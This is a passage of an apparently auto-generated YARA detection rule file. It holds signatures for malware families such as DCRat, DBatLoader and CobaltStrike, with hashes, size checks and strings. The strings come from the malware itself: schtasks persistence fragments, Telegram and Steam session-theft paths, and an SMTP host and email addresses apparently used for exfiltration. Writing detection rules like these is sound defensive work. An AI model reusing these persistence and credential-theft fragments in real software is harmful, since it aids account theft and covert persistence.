      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3b79e53a0c5ec614ee8f19931d8d3e560f0ce68bb24180de0d5b8b0b7d0dcb39"
      hash2 = "5c69a4e512220faeffc10abb6c42f6af09965bcbb54acc8be9ee4249e509f665"
   strings:
      $s1 = "smtp.uni-latex.com" fullword wide /* score: '26.00'*/
      $s2 = "Nezasaheditor.exe" fullword wide /* score: '22.00'*/
      $s3 = "\\Connection Tru Text\\LogString.txt" fullword wide /* score: '20.00'*/
      $s4 = "allan@uni-latex.com" fullword wide /* score: '18.00'*/
      $s5 = "hodiumalchest@gmail.com" fullword wide /* score: '18.00'*/
      $s6 = "\\Connection Tru Text\\ConnectionStrings.txt" fullword wide /* score: '15.00'*/
      $s7 = "ShellOpenFile" fullword wide /* score: '14.00'*/
      $s8 = "Select target directory" fullword wide /* score: '14.00'*/
      $s9 = "PASSWORD :" fullword wide /* score: '12.00'*/
      $s10 = "Insert PASSWORD" fullword wide /* score: '12.00'*/
      $s11 = "file_{0}.txt" fullword wide /* score: '11.00'*/
      $s12 = "\\\\192.168.2.200\\server ug\\KC PC" fullword wide /* score: '10.00'*/
      $s13 = "\\\\192.168.2.200\\server ug\\KC PC\\ZIP A " fullword wide /* score: '10.00'*/
      $s14 = "\\\\192.168.2.200\\server ug\\KC PC\\ZIP B " fullword wide /* score: '10.00'*/
      $s15 = "Compression of FILE : FAILED" fullword wide /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _d42595b695fc008ef2c56aabd8efd68e_imphash__691c1d6c_da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1f_22 {
   meta:
      description = "_subset_batch - from files d42595b695fc008ef2c56aabd8efd68e(imphash)_691c1d6c.exe, da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1fe.elf, DonutLoader(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf, f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4_f2bbba1e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "691c1d6c02c0153bdfaf6fb31506cd3aced24ed9902747c39fa6ac2094c202f1"
      hash2 = "da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5"
      hash3 = "93a76dcb046672ce458a272400fdc8040942c1dd8605ed7b81bc98fcca3b5e1b"
      hash4 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
      hash5 = "f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4"
   strings:
      $s1 = "net.getSystemDNSConfig" fullword ascii /* score: '18.00'*/
      $s2 = "context.deadlineExceededError.Temporary" fullword ascii /* score: '17.00'*/
      $s3 = "net.UnknownNetworkError.Temporary" fullword ascii /* score: '17.00'*/
      $s4 = "net.hostLookupOrder.String" fullword ascii /* score: '15.00'*/
      $s5 = "net.SplitHostPort.func1" fullword ascii /* score: '15.00'*/
      $s6 = "net.JoinHostPort" fullword ascii /* score: '15.00'*/
      $s7 = "net.getSystemNSS" fullword ascii /* score: '15.00'*/
      $s8 = "net.listenerBacklog.func1" fullword ascii /* score: '15.00'*/
      $s9 = "net.readHosts" fullword ascii /* score: '15.00'*/
      $s10 = "net.listenerBacklog" fullword ascii /* score: '15.00'*/
      $s11 = "net.SplitHostPort" fullword ascii /* score: '15.00'*/
      $s12 = "net.lookupStaticHost" fullword ascii /* score: '15.00'*/
      $s13 = "net.commonPrefixLen" fullword ascii /* score: '14.00'*/
      $s14 = "net.(*AddrError).Temporary" fullword ascii /* score: '14.00'*/
      $s15 = "net.(*DNSError).Temporary" fullword ascii /* score: '14.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _DBatLoader_signature__0450fabe4e07b9190f5cff35f33d9dea_imphash__DBatLoader_signature__29ce29b57ebba5226e5de7e7b26f6820_imph_23 {
   meta:
      description = "_subset_batch - from files DBatLoader(signature)_0450fabe4e07b9190f5cff35f33d9dea(imphash).exe, DBatLoader(signature)_29ce29b57ebba5226e5de7e7b26f6820(imphash).exe, DBatLoader(signature)_3c83dc5402fa63264804679108da9ffe(imphash).exe, DBatLoader(signature)_bf908eefef1abcc17154da68f29113d5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1626575d77b31d3b8cfebf81867d2dd2da280a4b83ab74a2852bc26143ca8aef"
      hash2 = "26b94c4ecc51acc762693fda08713b8ca9c8a8857898e700f06c34018f99e24a"
      hash3 = "571a0851d5035de2d982776a85a67243922ffcff87bfc3d98b3d0a277a5b86e5"
      hash4 = "5ee4fc645fa88cd85eddc57b9fc28733a891d0bb84a648a560264b983b9c5488"
   strings:
      $s1 = "4l4P494" fullword ascii /* reversed goodware string '494P4l4' */ /* score: '11.00'*/
      $s2 = "4d4P4>3" fullword ascii /* reversed goodware string '3>4P4d4' */ /* score: '11.00'*/
      $s3 = ".-,+*)('&%" fullword ascii /* reversed goodware string '%&'()*+,-.' */ /* score: '11.00'*/
      $s4 = "0O0H0C0" fullword ascii /* reversed goodware string '0C0H0O0' */ /* score: '11.00'*/
      $s5 = "1x1f1R1" fullword ascii /* reversed goodware string '1R1f1x1' */ /* score: '11.00'*/
      $s6 = "3w3P3'2" fullword ascii /* reversed goodware string '2'3P3w3' */ /* score: '11.00'*/
      $s7 = "0a0Z050" fullword ascii /* reversed goodware string '050Z0a0' */ /* score: '11.00'*/
      $s8 = "1p1i1@1" fullword ascii /* reversed goodware string '1@1i1p1' */ /* score: '11.00'*/
      $s9 = "*y*q*i*a*Y*Q*I*A*9*1*)*!*" fullword ascii /* reversed goodware string '*!*)*1*9*A*I*Q*Y*a*i*q*y*' */ /* score: '11.00'*/
      $s10 = "Igdgg:\\g6Y^aVkc>icV^gVK:" fullword ascii /* score: '10.00'*/
      $s11 = "%}%s%Y%A%7%0%$%" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( 8 of them )
      ) or ( all of them )
}

rule _c6ff86039714b862389db1ecb2cbf684beca716d91a95e1999debd5c24752a75_c6ff8603_ConnectWise_signature__9771ee6344923fa220489ab012_24 {
   meta:
      description = "_subset_batch - from files c6ff86039714b862389db1ecb2cbf684beca716d91a95e1999debd5c24752a75_c6ff8603.msi, ConnectWise(signature)_9771ee6344923fa220489ab01239bdfd(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c6ff86039714b862389db1ecb2cbf684beca716d91a95e1999debd5c24752a75"
      hash2 = "d1cc4b97a74096cc686c61bd020e0ab4bc9552aab515d367eaab9c6f139ded65"
   strings:
      $s1 = "failed to get WixShellExecBinaryId" fullword ascii /* score: '29.00'*/
      $s2 = "failed to get handle to kernel32.dll" fullword ascii /* score: '28.00'*/
      $s3 = "failed to process target from CustomActionData" fullword ascii /* score: '28.00'*/
      $s4 = "The process, %ls, could not be registered with the Restart Manager (probably because the setup is not elevated and the process i" ascii /* score: '26.00'*/
      $s5 = "failed to get WixShellExecTarget" fullword ascii /* score: '26.00'*/
      $s6 = "failed to get security descriptor's DACL - error code: %d" fullword ascii /* score: '26.00'*/
      $s7 = "App: %ls found running, %d processes, attempting to send message." fullword ascii /* score: '25.00'*/
      $s8 = "failed to schedule ExecServiceConfig action" fullword ascii /* score: '25.00'*/
      $s9 = "Command failed to execute." fullword ascii /* score: '25.00'*/
      $s10 = "failed to openexecute temp view with query %ls" fullword ascii /* score: '24.00'*/
      $s11 = "failed to get message to send to users when server reboots due to service failure." fullword ascii /* score: '23.00'*/
      $s12 = "WixShellExecTarget is %ls" fullword ascii /* score: '23.00'*/
      $s13 = "The process, %ls, could not be registered with the Restart Manager (probably because the setup is not elevated and the process i" ascii /* score: '23.00'*/
      $s14 = "WixShellExecTarget" fullword wide /* score: '23.00'*/
      $s15 = "failed to get reset period in days between service restart attempts." fullword ascii /* score: '22.00'*/
   condition:
      ( ( uint16(0) == 0xcfd0 or uint16(0) == 0x5a4d ) and filesize < 16000KB and pe.imphash() == "9771ee6344923fa220489ab01239bdfd" and ( 8 of them )
      ) or ( all of them )
}

rule _DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__01cf3732_DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_impha_25 {
   meta:
      description = "_subset_batch - from files DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_01cf3732.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_05af274a.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_164406a1.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2049b554.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_24c385ea.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2d460e88.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_566c604f.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8d1f945a.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c22ffc1b.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c5168a14.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e945de86.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ec259063.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "01cf3732fc2dda453bc38f2e3ee9d92d75e15c4559625bd1ffd209516128bf41"
      hash2 = "05af274a83acfef260398e86ef52f2a889c6dd7d2818e54b20e90ee535019b5b"
      hash3 = "164406a15fdde9b61ff47c268b9853bde4284f854b50975e2ccd648180d1dd97"
      hash4 = "2049b554fa0475b934d928927c95dbb42a979ad1e9356f0897ea83533575aec2"
      hash5 = "24c385ea07c1158d7c24d6be8814a8356cbe1f06aaf78835d3f09f52637c06eb"
      hash6 = "2d460e887cab8b04d177abcde12caaf3fc92da243a8774b04a46ae77fa0f2891"
      hash7 = "566c604f26742adb324f674132c9e3d7ae9015ad8e3301e7d5b9fc98b7c2e8f8"
      hash8 = "8d1f945ab98dd2e36451a886f621535448aadeaebc7dddb5fa38eb5c047f4f4b"
      hash9 = "c22ffc1b974658f59a252e303a22ea383a888911c8147fbc470c3e8120029fc8"
      hash10 = "c5168a141c82061514060cda27a45cb8d59be5465974f5e5477b5fd000ee1c29"
      hash11 = "e945de86856a0a84ba5655d2f379d7b6ecedfcd9d8a0bdf3ac0cb17161240521"
      hash12 = "ec259063f9999d8569781cea00cbff7da90f088ed04c79c494754949d3e07fa9"
   strings:
      $s1 = "%AppData% - Very Fast" fullword wide /* score: '26.00'*/
      $s2 = "schtasks.exe /create /tn \"" fullword wide /* score: '24.00'*/
      $s3 = "%UsersFolder% - Fast" fullword wide /* score: '24.00'*/
      $s4 = "Telegram.exe" fullword wide /* score: '22.00'*/
      $s5 = "schtasks.exe /delete /tn \"" fullword wide /* score: '21.00'*/
      $s6 = "/config/loginusers.vdf" fullword wide /* score: '21.00'*/
      $s7 = "%SystemDrive% - Slow" fullword wide /* score: '19.00'*/
      $s8 = "-Command \"" fullword wide /* score: '16.00'*/
      $s9 = "\" /sc ONLOGON /tr \"'" fullword wide /* score: '16.00'*/
      $s10 = "HKEY_CLASSES_ROOT\\tdesktop.tg\\shell\\open\\command" fullword wide /* score: '16.00'*/
      $s11 = "~Work.log" fullword wide /* score: '16.00'*/
      $s12 = "gettoken" fullword wide /* score: '16.00'*/
      $s13 = "Plugin couldn't process this action!" fullword wide /* score: '15.00'*/
      $s14 = "w32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2  1>nul" fullword wide /* score: '15.00'*/
      $s15 = "(\\w\\W.+)Telegram.exe" fullword wide /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Cephalus_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb2_26 {
   meta:
      description = "_subset_batch - from files Cephalus(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1fe.elf, DonutLoader(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf, f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4_f2bbba1e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a34acd47127196ab867d572c2c6cf2fcccffa3a7a87e82d338a8efed898ca722"
      hash2 = "da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5"
      hash3 = "93a76dcb046672ce458a272400fdc8040942c1dd8605ed7b81bc98fcca3b5e1b"
      hash4 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
      hash5 = "f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4"
   strings:
      $s1 = "math.Log" fullword ascii /* score: '19.00'*/
      $s2 = "**func(io.Reader) (*ecdh.PrivateKey, error)" fullword ascii /* score: '16.00'*/
      $s3 = "math.log2" fullword ascii /* score: '16.00'*/
      $s4 = "9*func(*ecdh.PrivateKey, *ecdh.PublicKey) ([]uint8, error)" fullword ascii /* score: '16.00'*/
      $s5 = "math.Log2" fullword ascii /* score: '16.00'*/
      $s6 = "*boring.PrivateKeyECDH" fullword ascii /* score: '15.00'*/
      $s7 = "reflect.StructTag.Get" fullword ascii /* score: '15.00'*/
      $s8 = "*boring.PublicKeyECDH" fullword ascii /* score: '15.00'*/
      $s9 = "reflect.Value.Comparable" fullword ascii /* score: '14.00'*/
      $s10 = "(*func([]uint8) (*ecdh.PrivateKey, error)" fullword ascii /* score: '13.00'*/
      $s11 = "'*func([]uint8) (*ecdh.PublicKey, error)" fullword ascii /* score: '13.00'*/
      $s12 = "reflect.(*rtype).common" fullword ascii /* score: '11.00'*/
      $s13 = "time.Time.Date" fullword ascii /* score: '11.00'*/
      $s14 = "reflect.(*rtype).Comparable" fullword ascii /* score: '11.00'*/
      $s15 = "reflect.(*Value).Comparable" fullword ascii /* score: '11.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _DBatLoader_signature__ccc8dfebc5d9971e8491d80ecc850a15_imphash__DBatLoader_signature__ccc8dfebc5d9971e8491d80ecc850a15_imph_27 {
   meta:
      description = "_subset_batch - from files DBatLoader(signature)_ccc8dfebc5d9971e8491d80ecc850a15(imphash).exe, DBatLoader(signature)_ccc8dfebc5d9971e8491d80ecc850a15(imphash)_2b2813d9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0dfd9f9027f0f6eeb381e55a0668b5b5a146fd4310f10edceeda4454eeaab924"
      hash2 = "2b2813d971b9a081db71183c0687b4a80b423a1228617b13a13f1baaa6ba9158"
   strings:
      $s1 = "ANouveau login" fullword ascii /* score: '15.00'*/
      $s2 = "&Auteur : Bacterius (www.delphifr.com)." fullword ascii /* score: '14.00'*/
      $s3 = "Ce logiciel vous permettra de stocker tous vos mots de passe de fa" fullword ascii /* score: '12.00'*/
      $s4 = "Golden Passwords" fullword ascii /* score: '12.00'*/
      $s5 = "EComponentErrorP" fullword ascii /* score: '10.00'*/
      $s6 = "OnGetSiteInfo<" fullword ascii /* score: '9.00'*/
      $s7 = "Cryptosystem" fullword ascii /* score: '9.00'*/
      $s8 = "7 7+787=7" fullword ascii /* score: '9.00'*/ /* hex encoded string 'wxw' */
      $s9 = "7 7$7(7,7A7\\7" fullword ascii /* score: '9.00'*/ /* hex encoded string 'wwzw' */
      $s10 = " sur la technologie SEA, coupl" fullword ascii /* score: '9.00'*/
      $s11 = "Comments2" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and pe.imphash() == "ccc8dfebc5d9971e8491d80ecc850a15" and ( 8 of them )
      ) or ( all of them )
}

rule _c9adc83b45e363b21cd6b11b5da0501f_imphash__c9adc83b45e363b21cd6b11b5da0501f_imphash__16ac0b5d_c9adc83b45e363b21cd6b11b5da050_28 {
   meta:
      description = "_subset_batch - from files c9adc83b45e363b21cd6b11b5da0501f(imphash).exe, c9adc83b45e363b21cd6b11b5da0501f(imphash)_16ac0b5d.exe, c9adc83b45e363b21cd6b11b5da0501f(imphash)_b3b6f660.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7d77e9605d392c5989c0a12ea3a8c3909266f11f8dcea877af6a25ef938f9635"
      hash2 = "16ac0b5d2b25528812c2e6bbe94b9e266b37be6aa56db97192def60a74e63dbe"
      hash3 = "b3b6f660bc37e1ece5e638dfdaf87b97899df972f6cebe5062fd964142b1fcce"
   strings:
      $s1 = "web.detectiv@gmail.com" fullword ascii /* score: '21.00'*/
      $s2 = "WinMenuItems.Button0.Command" fullword ascii /* score: '19.00'*/
      $s3 = "WinMenuItems.Button3.Command" fullword ascii /* score: '19.00'*/
      $s4 = "WinMenuItems.Button2.Command" fullword ascii /* score: '19.00'*/
      $s5 = "TitlebarButtons.Button2.Command" fullword ascii /* score: '19.00'*/
      $s6 = "TitlebarButtons.Button3.Command" fullword ascii /* score: '19.00'*/
      $s7 = "TitlebarButtons.Button1.Command" fullword ascii /* score: '19.00'*/
      $s8 = "WinMenuItems.Button1.Command" fullword ascii /* score: '19.00'*/
      $s9 = "TitlebarButtons.Button0.Command" fullword ascii /* score: '19.00'*/
      $s10 = "HideWhenExecutedWaitMillisec" fullword ascii /* score: '18.00'*/
      $s11 = "HideWhenExecuted" fullword ascii /* score: '18.00'*/
      $s12 = "  <description>Smart Install Maker - create setup software</description>" fullword ascii /* score: '18.00'*/
      $s13 = "HideWhenExecutedFirst" fullword ascii /* score: '18.00'*/
      $s14 = "hoProcess" fullword ascii /* score: '15.00'*/
      $s15 = "@$&%04\\Uninstall.exe" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and pe.imphash() == "c9adc83b45e363b21cd6b11b5da0501f" and ( 8 of them )
      ) or ( all of them )
}

rule _c7269d59926fa4252270f407e4dab043_imphash__c7269d59926fa4252270f407e4dab043_imphash__f234f9b7_d42595b695fc008ef2c56aabd8efd6_29 {
   meta:
      description = "_subset_batch - from files c7269d59926fa4252270f407e4dab043(imphash).exe, c7269d59926fa4252270f407e4dab043(imphash)_f234f9b7.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_691c1d6c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4c5a823ae5350380c8193063b4d5f01e338b82481f19ddd106d0b3d06058476b"
      hash2 = "f234f9b798ad23cb4bafca43e166a651ae2bb52bd7df8b004ebb163f0a87cbfd"
      hash3 = "691c1d6c02c0153bdfaf6fb31506cd3aced24ed9902747c39fa6ac2094c202f1"
   strings:
      $s1 = "runtime.processorVersionInfo" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.mutexprofilerate" fullword ascii /* score: '21.00'*/
      $s3 = "runtime.execLock" fullword ascii /* score: '19.00'*/
      $s4 = "syscall.procGetProcessTimes" fullword ascii /* score: '19.00'*/
      $s5 = "syscall.procGetExitCodeProcess" fullword ascii /* score: '19.00'*/
      $s6 = "syscall.procGetCurrentProcess" fullword ascii /* score: '19.00'*/
      $s7 = "internal/poll.logInitFD" fullword ascii /* score: '19.00'*/
      $s8 = "runtime.printBacklogIndex" fullword ascii /* score: '18.00'*/
      $s9 = "runtime.getlasterror.abi0" fullword ascii /* score: '18.00'*/
      $s10 = "syscall.procCreateProcessAsUserW" fullword ascii /* score: '17.00'*/
      $s11 = "runtime.hashkey" fullword ascii /* score: '16.00'*/
      $s12 = "runtime.buildVersion.str" fullword ascii /* score: '16.00'*/
      $s13 = "runtime.levelLogPages" fullword ascii /* score: '15.00'*/
      $s14 = "runtime.printBacklog" fullword ascii /* score: '15.00'*/
      $s15 = "os.ErrProcessDone" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _cdb0a360cca7a5099c2d2357be1a833e032ffdeb3f467a6fac845f6bb77031c9_cdb0a360_df875748170a5e5cf55bd12dfdc70ae68bd91219b0d4bd71b_30 {
   meta:
      description = "_subset_batch - from files cdb0a360cca7a5099c2d2357be1a833e032ffdeb3f467a6fac845f6bb77031c9_cdb0a360.exe, df875748170a5e5cf55bd12dfdc70ae68bd91219b0d4bd71b4320fb095cbe3b3_df875748.exe, f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_662a1ce6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cdb0a360cca7a5099c2d2357be1a833e032ffdeb3f467a6fac845f6bb77031c9"
      hash2 = "df875748170a5e5cf55bd12dfdc70ae68bd91219b0d4bd71b4320fb095cbe3b3"
      hash3 = "662a1ce669ea5867deb1e22b76c29e8a4d6e2cd8b8becbec0aa7dc9d80748a60"
   strings:
      $x1 = "costura.newtonsoft.json.dll.compressed|13.0.0.0|Newtonsoft.Json, Version=13.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6a" ascii /* score: '41.00'*/
      $x2 = "costura.newtonsoft.json.dll.compressed|13.0.0.0|Newtonsoft.Json, Version=13.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6a" ascii /* score: '39.00'*/
      $s3 = "costura.system.runtime.compilerservices.unsafe.dll.compressed" fullword wide /* score: '28.00'*/
      $s4 = "costura.system.memory.dll.compressed" fullword wide /* score: '25.00'*/
      $s5 = "costura.system.buffers.dll.compressed" fullword wide /* score: '25.00'*/
      $s6 = "costura.system.numerics.vectors.dll.compressed" fullword wide /* score: '25.00'*/
      $s7 = "costura.newtonsoft.json.dll.compressed" fullword wide /* score: '22.00'*/
      $s8 = "costura.costura.dll.compressed" fullword wide /* score: '22.00'*/
      $s9 = "system.runtime.compilerservices.unsafe" fullword wide /* score: '20.00'*/
      $s10 = "eed|Newtonsoft.Json.dll|1E76E6099570EDE620B76ED47CF8D03A936D49F8|711952" fullword ascii /* score: '18.00'*/
      $s11 = ".compressed" fullword wide /* score: '11.00'*/
      $s12 = "system.buffers" fullword wide /* score: '10.00'*/
      $s13 = "system.memory" fullword wide /* score: '10.00'*/
      $s14 = "system.numerics.vectors" fullword wide /* score: '10.00'*/
      $s15 = "costura" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _f34d5f2d4577ed6d9ceec516c1f5a744_imphash__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__06f0b886_f34d5f2d4577ed6d9ceec516c1f5a7_31 {
   meta:
      description = "_subset_batch - from files f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_06f0b886.exe, f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1c90519a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1dfd349f202c8822cbe2b45a23105b54c89eb01aa27c840b2dccdd483040da1c"
      hash2 = "06f0b88659c9536d7b3907e161ce141b07822391c82d1784d35c79876d1ab630"
      hash3 = "1c90519a6d75be37ef3ed591bfea92effa0cc0f724993f440977486368eacaf0"
   strings:
      $s1 = "C:\\Users\\Name\\OneStart.ai" fullword ascii /* score: '24.00'*/
      $s2 = "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:Description rdf:ab" ascii /* score: '23.00'*/
      $s3 = "OneStart.exe" fullword wide /* score: '22.00'*/
      $s4 = "UpdaterSetup.exe" fullword wide /* score: '22.00'*/
      $s5 = "When searching with the default search engine, results open in an alternate reading pane. This allows users to view both the sea" wide /* score: '18.00'*/
      $s6 = "\"uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b\" xmlns:tiff=\"http://ns.adobe.com/tiff/1.0/\"><tiff:Orientation>1</tiff:Orientation" ascii /* score: '17.00'*/
      $s7 = "https://onestartbase.com/chr/inst/status/" fullword wide /* score: '17.00'*/
      $s8 = "get_SetupTempPath" fullword ascii /* score: '16.00'*/
      $s9 = "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:Description rdf:ab" ascii /* score: '16.00'*/
      $s10 = "LogInstallStart" fullword ascii /* score: '15.00'*/
      $s11 = "logInstallStartTask" fullword ascii /* score: '15.00'*/
      $s12 = "logInstallAcceptTask" fullword ascii /* score: '15.00'*/
      $s13 = "get_AppShortDescriptionText" fullword ascii /* score: '15.00'*/
      $s14 = "get_AppDescriptionText" fullword ascii /* score: '15.00'*/
      $s15 = "LogInstallAccept" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _c7269d59926fa4252270f407e4dab043_imphash__c7269d59926fa4252270f407e4dab043_imphash__f234f9b7_CobaltStrike_signature__f0ea7b_32 {
   meta:
      description = "_subset_batch - from files c7269d59926fa4252270f407e4dab043(imphash).exe, c7269d59926fa4252270f407e4dab043(imphash)_f234f9b7.exe, CobaltStrike(signature)_f0ea7b7844bbc5bfa9bb32efdcea957c(imphash).exe, f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4_f2bbba1e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4c5a823ae5350380c8193063b4d5f01e338b82481f19ddd106d0b3d06058476b"
      hash2 = "f234f9b798ad23cb4bafca43e166a651ae2bb52bd7df8b004ebb163f0a87cbfd"
      hash3 = "da2e0c0fcb8accb823745b294de378f99bcfa6fc9856ee21f1ad46bceef1f0ec"
      hash4 = "f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4"
   strings:
      $s1 = "sync.runtime_SemacquireMutex" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.traceGCSweepStart" fullword ascii /* score: '15.00'*/
      $s3 = "sync.(*Mutex).unlockSlow" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.getRandomData" fullword ascii /* score: '15.00'*/
      $s5 = "sync.(*Mutex).lockSlow" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.traceGCSweepSpan" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.traceGCSweepDone" fullword ascii /* score: '15.00'*/
      $s8 = "runtime.getargp" fullword ascii /* score: '15.00'*/
      $s9 = "runtime.name.data" fullword ascii /* score: '14.00'*/
      $s10 = "runtime.name.isExported" fullword ascii /* score: '13.00'*/
      $s11 = "runtime.int64Hash" fullword ascii /* score: '13.00'*/
      $s12 = "runtime.runOpenDeferFrame" fullword ascii /* score: '13.00'*/
      $s13 = "runtime.addOneOpenDeferFrame.func1.1" fullword ascii /* score: '13.00'*/
      $s14 = "runtime.traceBufPtr.ptr" fullword ascii /* score: '13.00'*/
      $s15 = "runtime.addOneOpenDeferFrame" fullword ascii /* score: '13.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _c7269d59926fa4252270f407e4dab043_imphash__c7269d59926fa4252270f407e4dab043_imphash__f234f9b7_Cephalus_signature__d42595b695_33 {
   meta:
      description = "_subset_batch - from files c7269d59926fa4252270f407e4dab043(imphash).exe, c7269d59926fa4252270f407e4dab043(imphash)_f234f9b7.exe, Cephalus(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, CobaltStrike(signature)_f0ea7b7844bbc5bfa9bb32efdcea957c(imphash).exe, da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1fe.elf, DonutLoader(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf, f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4_f2bbba1e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4c5a823ae5350380c8193063b4d5f01e338b82481f19ddd106d0b3d06058476b"
